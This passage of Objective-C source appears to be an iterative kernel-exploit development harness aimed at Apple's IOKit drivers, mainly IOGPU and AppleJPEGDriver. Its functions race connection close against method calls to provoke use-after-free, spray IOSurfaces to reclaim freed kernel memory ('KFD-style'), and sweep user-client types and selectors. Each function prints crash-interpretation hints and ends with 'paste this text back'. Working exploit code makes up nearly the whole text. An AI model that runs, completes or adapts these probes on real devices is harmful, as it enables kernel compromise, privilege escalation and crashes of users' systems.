        io_service_t svc = m ? pGet(*pMainPort, m) : 0;
        if (!svc) { [out appendString:@"STOP no svc\n"]; goto done; }

        io_connect_t connA = 0, connB = 0;
        pOpen(svc, mach_task_self(), 0, &connA);
        pOpen(svc, mach_task_self(), 0, &connB);
        pRelease(svc);
        if (!connA || !connB) { [out appendString:@"STOP no conns\n"]; goto done; }

        __block volatile int go = 0;
        __block volatile int hits = 0;
        __block volatile int dead = 0;
        __block volatile int errs = 0;
        __block kern_return_t closeRc = -1;

        dispatch_queue_t q1 = dispatch_queue_create("p008.2c.close2", NULL);
        dispatch_queue_t q2 = dispatch_queue_create("p008.2c.call2", NULL);
        dispatch_group_t grp = dispatch_group_create();

        // Thread A: close connA first
        dispatch_group_async(grp, q1, ^{
            while (!go) {}
            closeRc = pClose(connA);
        });

        // Thread B: call sel=0 on connB
        dispatch_group_async(grp, q2, ^{
            while (!go) {}
            uint64_t sc[1] = {0};
            for (int i = 0; i < 50000; i++) {
                kern_return_t r = pCall(connB, 0, sc, 0, NULL, 0, NULL, NULL, NULL, NULL);
                if (r == 0) hits++;
                else if (r == 0x10000003) dead++;
                else errs++;
            }
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        [out appendFormat:@"2-conn rev: hits=%d dead=%d errs=%d closeA=0x%08x\n",
            hits, dead, errs, (unsigned)closeRc];
        [out appendString:@"panic = shared state UAF. survived = no shared state.\n"];

        if (connB) pClose(connB);
    }

done:

    free(s5buf);

    [out appendString:@"\n=== Summary ===\n"];
    [out appendString:@"panic = UAF on JPEG driver.\n"];
    [out appendString:@"hits>0 + survived = race window exists but method doesn't deref freed obj.\n"];
    [out appendString:@"All dead=50000 = close too fast, need delay.\n"];
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// P010 Advanced: sel=23 after setup, IOConnectMapMemory64, IOSurface spray
+ (NSString *)runP010Advanced {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 Advanced ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    typedef kern_return_t (*MapMem64_t)(io_connect_t, uint32_t, uint64_t, uint64_t,
        uint64_t *, vm_offset_t *, mach_vm_size_t *, int);
    MapMem64_t pMapMem = dlsym(iokit, "IOConnectMapMemory64");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    uint32_t qid = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"conn=%u qid=%u\n", conn, qid];

    // Step 1: setup with sel=8/16, then try sel=23
    [out appendString:@"\n--- sel=23 after sel=8/16 setup ---\n"];
    {
        uint64_t sc8[1] = {qid};
        kern_return_t r8 = pCall(conn, 8, sc8, 1, NULL, 0, NULL, NULL, NULL, NULL);
        uint64_t sc16[1] = {qid};
        kern_return_t r16 = pCall(conn, 16, sc16, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"setup: sel=8=0x%08x sel=16=0x%08x\n", (unsigned)r8, (unsigned)r16];

        for (uint32_t sc = 0; sc <= 4; sc++) {
            uint64_t sbuf[4] = {qid, 0, 1, 0x40};
            uint32_t osc = 0; size_t oss = 0;
            kern_return_t r = pCall(conn, 23, sbuf, sc, NULL, 0, NULL, &osc, NULL, &oss);
            [out appendFormat:@"sel=23 sc=%u: rc=0x%08x\n", sc, (unsigned)r];
            if (r == 0) { [out appendString:@" *** SUCCESS ***\n"]; break; }
        }
        for (uint32_t ss = 0x10; ss <= 0x200; ss += 0x10) {
            uint64_t sbuf[4] = {qid, 0, 1, ss};
            void *dbuf = calloc(1, ss);
            kern_return_t r = pCall(conn, 23, sbuf, 4, dbuf, ss, NULL, NULL, NULL, NULL);
            if (r == 0) { [out appendFormat:@"sel=23 sc=4 ss=0x%x: SUCCESS\n", ss]; free(dbuf); break; }
            free(dbuf);
        }
    }

    // Step 2: IOConnectMapMemory64 probe (skip — crashes with type=0)
    [out appendString:@"\n--- IOConnectMapMemory64 (skipped — crashes) ---\n"];

    // Step 3: Race sel=23 vs close (if sel=23 works now)
    [out appendString:@"\n--- sel=23 race vs close ---\n"];
    {
        void *dev2 = pDevCreate(svc);
        io_connect_t conn2 = dev2 ? pGetConn(dev2) : 0;
        void *a2 = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)a2 + 0x400) = *(uint32_t *)((uint8_t *)dev2 + 0x08);
        *(uint8_t *)((uint8_t *)a2 + 0x404) = *(uint8_t *)((uint8_t *)dev2 + 0x08);
        void *q2 = pQueueCreate(dev2, a2, 0x410);
        free(a2);
        uint32_t qid2 = pGetID ? pGetID(q2) : 1;
        if (!conn2 || !q2) { [out appendString:@"STOP no conn2\n"]; goto cleanup; }

        // Setup sel=8/16 on conn2
        uint64_t sc8[1] = {qid2};
        pCall(conn2, 8, sc8, 1, NULL, 0, NULL, NULL, NULL, NULL);
        uint64_t sc16[1] = {qid2};
        pCall(conn2, 16, sc16, 1, NULL, 0, NULL, NULL, NULL, NULL);

        __block volatile int go = 0;
        __block volatile int hits = 0;
        __block volatile int dead = 0;
        __block kern_return_t closeRc = -1;

        dispatch_group_t grp = dispatch_group_create();
        for (int t = 0; t < 4; t++) {
            dispatch_queue_t tq = dispatch_queue_create("p010.adv", NULL);
            dispatch_group_async(grp, tq, ^{
                while (!go) {}
                uint64_t sc[1] = {qid2};
                for (int i = 0; i < 25000; i++) {
                    kern_return_t r = pCall(conn2, 23, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    if (r == 0) hits++;
                    else if (r == 0x10000003) dead++;
                }
            });
        }
        dispatch_queue_t cq = dispatch_queue_create("p010.advclose", NULL);
        dispatch_group_async(grp, cq, ^{
            while (!go) {}
            closeRc = pClose(conn2);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
        [out appendFormat:@"sel=23 race: hits=%d dead=%d close=0x%08x\n",
            hits, dead, (unsigned)closeRc];
        if (dev2 && pDevRelease) pDevRelease(dev2);
    }

cleanup:
    if (dev && pDevRelease) pDevRelease(dev);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #1: IOSurface heap spray to reclaim freed IOGPU device memory (KFD-style).
// No race needed — sequential: create IOGPU → close (free device) → spray IOSurfaces
// → if any deferred GPU callback fires, it dereferences our controlled data.
+ (NSString *)runP010SurfaceSpray {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 IOSurface Heap Spray (KFD-style) ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iogpu || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    IOSurfaceGetAllocSize_t iosAlloc = dlsym(iosH, "IOSurfaceGetAllocSize");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    // Step 1: Create IOGPU device + queue + call sel=8/16 to set up state
    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    uint32_t qid = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"created: conn=%u qid=%u dev=%p\n", conn, qid, dev];

    // Call sel=8 and sel=16 to set up kernel state
    uint64_t sc8[1] = {qid};
    pCall(conn, 8, sc8, 1, NULL, 0, NULL, NULL, NULL, NULL);
    uint64_t sc16[1] = {qid};
    pCall(conn, 16, sc16, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [out appendString:@"sel=8/16 setup done\n"];

    // Step 2: Close the connection — frees the GPU device in kernel
    kern_return_t cr = pClose(conn);
    [out appendFormat:@"close: rc=0x%08x\n", (unsigned)cr];
    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);
    [out appendString:@"GPU device freed — spraying IOSurfaces now\n"];

    // Step 3: Spray IOSurfaces to reclaim the freed GPU device memory
    // GPU device is ~0x120 bytes (kalloc). We need IOSurfaces that allocate
    // kernel objects in the same kalloc zone.
    // IOSurface objects are allocated in kalloc and have可控 fields.
    [out appendString:@"\n--- IOSurface spray ---\n"];
    NSMutableArray *surfaces = [NSMutableArray array];
    int sprayCount = 200;
    for (int i = 0; i < sprayCount; i++) {
        // Vary the size to hit different kalloc zones
        uint32_t w = 64, h = 64;
        NSDictionary *props = @{
            @"IOSurfaceWidth": @(w), @"IOSurfaceHeight": @(h),
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfaceBytesPerRow": @(w * 4),
            @"IOSurfaceAllocSize": @(w * h * 4),
            @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
        };
        IOSurfaceRef s = iosCreate((__bridge CFDictionaryRef)props);
        if (s) {
            [surfaces addObject:(__bridge id)s];
            uint32_t sid = iosGetID(s);
            if (i < 5 || i == sprayCount - 1) {
                [out appendFormat:@"surface[%d] id=%u alloc=%zu\n",
                    i, sid, iosAlloc(s)];
            }
        }
    }
    [out appendFormat:@"sprayed %d IOSurfaces\n", (int)[surfaces count]];

    // Step 4: Try to trigger any deferred GPU callback by calling sel=8 on a NEW connection
    // If the freed GPU device memory was reclaimed by an IOSurface, and a deferred
    // GPU callback tries to access it, we get a panic (UAF confirmed).
    [out appendString:@"\n--- trigger check: new IOGPU conn ---\n"];
    {
        m = pMatching("IOGPU");
        svc = m ? pGet(*pMainPort, m) : 0;
        if (svc) {
            void *dev2 = pDevCreate(svc);
            if (dev2) {
                io_connect_t conn2 = pGetConn(dev2);
                void *a2 = calloc(1, 0x410);
                *(uint32_t *)((uint8_t *)a2 + 0x400) = *(uint32_t *)((uint8_t *)dev2 + 0x08);
                *(uint8_t *)((uint8_t *)a2 + 0x404) = *(uint8_t *)((uint8_t *)dev2 + 0x08);
                void *q2 = pQueueCreate(dev2, a2, 0x410);
                free(a2);
                uint32_t qid2 = pGetID ? pGetID(q2) : 1;
                [out appendFormat:@"new conn=%u qid=%u\n", conn2, qid2];

                // Call sel=8 on new conn — might trigger deferred work from old conn
                uint64_t sc[1] = {qid2};
                kern_return_t r = pCall(conn2, 8, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
                [out appendFormat:@"new sel=8: rc=0x%08x\n", (unsigned)r];

                // Also try sel=16
                r = pCall(conn2, 16, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
                [out appendFormat:@"new sel=16: rc=0x%08x\n", (unsigned)r];

                pClose(conn2);
                if (pDevRelease) pDevRelease(dev2);
            }
            pRelease(svc);
        }
    }

    [out appendFormat:@"\nsurvived = spray didn't reclaim GPU device, or no deferred callback.\n"];
    [out appendString:@"panic = UAF confirmed (IOSurface reclaimed freed device).\n"];
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #3: IOServiceOpen with different types to find the submit method.
// Type=0 is what we've been using. Types 1-255 might create different
// user clients with different dispatch tables (and different selectors).
+ (NSString *)runP010TypeSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 IOServiceOpen Type Sweep ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }

    // Try IOServiceOpen with types 0-10
    // Type 0 = what IOGPUDeviceCreate uses internally
    // Other types might open different user clients
    [out appendString:@"--- IOServiceOpen type sweep ---\n"];
    for (uint32_t type = 0; type <= 10; type++) {
        io_connect_t conn = 0;
        kern_return_t kr = pOpen(svc, mach_task_self(), type, &conn);
        if (kr == 0 && conn) {
            [out appendFormat:@"type=%u: conn=%u ***\n", type, conn];

            // Sweep selectors on this connection
            int foundSels = 0;
            for (uint32_t sel = 0; sel <= 40; sel++) {
                for (uint32_t sc = 0; sc <= 1; sc++) {
                    uint64_t sbuf[2] = {1, 0};
                    uint32_t osc = 0; size_t oss = 0;
                    kern_return_t r = pCall(conn, sel, sbuf, sc, NULL, 0, NULL, &osc, NULL, &oss);
                    if (r != 0xe00002c2 && r != 0x10000003) {
                        [out appendFormat:@"  type=%u sel=%u sc=%u: rc=0x%08x\n",
                            type, sel, sc, (unsigned)r];
                        foundSels++;
                    }
                }
            }
            if (foundSels == 0) [out appendFormat:@"  type=%u: no valid selectors\n", type];
            pClose(conn);
        } else {
            [out appendFormat:@"type=%u: open FAILED 0x%08x\n", type, (unsigned)kr];
        }
    }

    // Also try with the IOGPU framework (IOGPUDeviceCreate) for comparison
    [out appendString:@"\n--- IOGPUDeviceCreate baseline ---\n"];
    void *dev = pDevCreate(svc);
    if (dev) {
        io_connect_t conn = pGetConn(dev);
        [out appendFormat:@"IOGPUDeviceCreate: conn=%u\n", conn];
        // Check what type IOGPUDeviceCreate uses by comparing conn values
        for (uint32_t sel = 0; sel <= 40; sel++) {
            uint64_t sbuf[1] = {1};
            uint32_t osc = 0; size_t oss = 0;
            kern_return_t r = pCall(conn, sel, sbuf, 1, NULL, 0, NULL, &osc, NULL, &oss);
            if (r != 0xe00002c2 && r != 0x10000003) {
                [out appendFormat:@"  iogpu sel=%u sc=1: rc=0x%08x\n", sel, (unsigned)r];
            }
        }
        pClose(conn);
        if (pDevRelease) pDevRelease(dev);
    }

    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #2: Cross-primitive IOSurface sharing (IOGPU + JPEG)
+ (NSString *)runP010CrossSurface {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 Cross-Primitive IOSurface ===\n\n"];
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iogpu || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    NSDictionary *props = @{@"IOSurfaceWidth":@64,@"IOSurfaceHeight":@64,
        @"IOSurfaceBytesPerElement":@4,@"IOSurfaceBytesPerRow":@(64*4),
        @"IOSurfaceAllocSize":@(64*64*4),@"IOSurfacePixelFormat":@((unsigned int)'BGRA')};
    IOSurfaceRef sharedSurf = iosCreate((__bridge CFDictionaryRef)props);
    uint32_t surfID = iosGetID(sharedSurf);
    [out appendFormat:@"shared IOSurface id=%u\n", surfID];

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t gpuSvc = m ? pGet(*pMainPort, m) : 0;
    void *gpuDev = gpuSvc ? pDevCreate(gpuSvc) : NULL;
    io_connect_t gpuConn = gpuDev ? pGetConn(gpuDev) : 0;
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)gpuDev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)gpuDev + 0x08);
    void *queue = pQueueCreate(gpuDev, args, 0x410);
    free(args);
    uint32_t qid = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"IOGPU: conn=%u qid=%u\n", gpuConn, qid];

    CFMutableDictionaryRef jm = pMatching("AppleJPEGDriver");
    io_service_t jpegSvc = jm ? pGet(*pMainPort, jm) : 0;
    io_connect_t jpegConn = 0;
    if (jpegSvc) { pOpen(jpegSvc, mach_task_self(), 0, &jpegConn); pRelease(jpegSvc); }
    [out appendFormat:@"JPEG: conn=%u\n", jpegConn];

    if (gpuConn) {
        uint64_t sc[1] = {qid};
        pCall(gpuConn, 8, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
        pCall(gpuConn, 16, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
    }
    if (jpegConn) {
        uint8_t *buf = calloc(1, 0x1000);
        uint32_t *u32 = (uint32_t *)buf;
        u32[0]=64; u32[1]=64; u32[5]=64; u32[6]=64;
        *(uint64_t*)(buf+0x30) = surfID; *(uint64_t*)(buf+0x38) = surfID;
        u32[0x12] = 1; *(uint32_t*)(buf+0x80) = 64*64*4;
        kern_return_t r = pCall(jpegConn, 5, NULL, 0, buf, 0x1000, NULL, NULL, NULL, NULL);
        [out appendFormat:@"JPEG sel=5 before: rc=0x%08x\n", (unsigned)r];
        free(buf);
    }

    [out appendString:@"\nclosing IOGPU...\n"];
    if (gpuConn) pClose(gpuConn);
    if (gpuDev && pDevRelease) pDevRelease(gpuDev);
    if (gpuSvc) pRelease(gpuSvc);

    [out appendString:@"accessing surface via JPEG after GPU close...\n"];
    if (jpegConn) {
        uint8_t *buf = calloc(1, 0x1000);
        uint32_t *u32 = (uint32_t *)buf;
        u32[0]=64; u32[1]=64; u32[5]=64; u32[6]=64;
        *(uint64_t*)(buf+0x30) = surfID; *(uint64_t*)(buf+0x38) = surfID;
        u32[0x12] = 1; *(uint32_t*)(buf+0x80) = 64*64*4;
        kern_return_t r = pCall(jpegConn, 5, NULL, 0, buf, 0x1000, NULL, NULL, NULL, NULL);
        [out appendFormat:@"JPEG sel=5 after: rc=0x%08x\n", (unsigned)r];
        free(buf);
    }
    [out appendString:@"panic = shared surface UAF. survived = not shared.\n"];
    if (jpegConn) pClose(jpegConn);
    (void)sharedSurf;
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #5: IOConnectMapMemory64 with safe types (1-10, skip type=0 which crashed)
+ (NSString *)runP010MapSafe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 IOConnectMapMemory64 Safe ===\n\n"];
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { [out appendString:@"STOP dlopen\n"]; return out; }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    typedef kern_return_t (*MapMem64_t)(io_connect_t, uint32_t, uint64_t, uint64_t,
        uint64_t *, vm_offset_t *, mach_vm_size_t *, int);
    MapMem64_t pMapMem = dlsym(iokit, "IOConnectMapMemory64");
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    uint32_t qid = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"conn=%u qid=%u\n", conn, qid];

    [out appendString:@"\n--- map types 1-10 (DISABLED — crashes kernel) ---\n"];
    [out appendString:@"IOConnectMapMemory64 causes kernel null deref. Skipping.\n"];
    // Previously: tried types 1-10, all crashed. Disabled.

    // If any mapping succeeded, try: close then access mapped memory
    [out appendString:@"\n--- stale mapping test ---\n"];
    // (Would need a successful map first; for now just report)
    [out appendString:@"no successful mappings — cannot test stale access\n"];

    pClose(conn);
    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// #6: sel=33/34 after sel=8/16 setup
+ (NSString *)runP010Sel33 {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 sel=33/34 After Setup ===\n\n"];
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { [out appendString:@"STOP dlopen\n"]; return out; }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
